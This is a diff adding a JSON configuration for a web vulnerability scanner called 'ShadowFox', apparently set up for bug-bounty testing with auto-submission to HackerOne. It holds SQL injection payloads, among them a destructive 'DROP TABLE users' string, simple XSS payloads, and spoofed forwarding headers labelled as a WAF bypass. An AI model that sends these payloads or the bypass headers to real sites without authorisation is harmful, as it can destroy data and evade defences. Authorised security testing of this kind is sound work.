@@ -1,0 +1,50 @@
+{
+  "meta": {
+    "project": "ShadowFox",
+    "version": "11",
+    "last_updated": "2025-05-23"
+  },
+  "targets": {
+    "sql_injection": ["https://example1.com", "https://example2.com"],
+    "xss": ["https://example3.com"],
+    "lfi": [],
+    "rce": []
+  },
+  "headers": {
+    "default": {
+      "User-Agent": "ShadowFoxScanner/1.0",
+      "Accept": "*/*"
+    },
+    "waf_bypass_1": {
+      "X-Originating-IP": "127.0.0.1",
+      "X-Forwarded-For": "127.0.0.1",
+      "User-Agent": "Mozilla/5.0"
+    }
+  },
+  "payloads": {
+    "sql_injection": [
+      "' OR '1'='1",
+      "'; DROP TABLE users;--"
+    ],
+    "xss": [
+      "<img src=x onerror=alert(1)>",
+      "<script>alert('xss')</script>"
+    ]
+  },
+  "mutators": {
+    "active": ["encoder", "obfuscator", "unicode_mixer"]
+  },
+  "logging": {
+    "snapshot_dir": "logs/snapshots/",
+    "confirmed_hits": "reports/confirmed_hits.json"
+  },
+  "report": {
+    "pdf_path": "reports/final.pdf",
+    "html_path": "reports/final.html"
+  },
+  "submit": {
+    "enabled": true,
+    "method": "hackerone",
+    "auto_compress": true
+  }
+}
